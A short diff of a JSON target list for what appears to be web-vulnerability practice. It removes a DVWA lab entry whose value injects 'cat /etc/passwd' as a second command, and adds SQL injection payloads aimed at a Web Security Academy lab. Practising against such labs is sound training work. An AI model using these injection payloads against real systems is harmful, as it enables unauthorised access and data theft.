@@ -1,14 +1,12 @@
 [
   {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/exec/",
-    "method": "POST",
-    "param": "ip",
-    "values": ["test&cat /etc/passwd&"]
-  },
-  {
-    "url": "http://192.168.153.200/DVWA/vulnerabilities/weak_id/",
-    "method": "POST",
-    "param": "step",
-    "values": ["1"]
+    "url": "https://0a5c001d042ad831802c9ada009c00f2.web-security-academy.net/filter",
+    "method": "GET",
+    "param": "category",
+    "values": [
+      "Clothing, shoes and accessories",
+      "Clothing, shoes and accessories' OR '1'='1",
+      "Clothing, shoes and accessories'--"
+    ]
   }
 ]
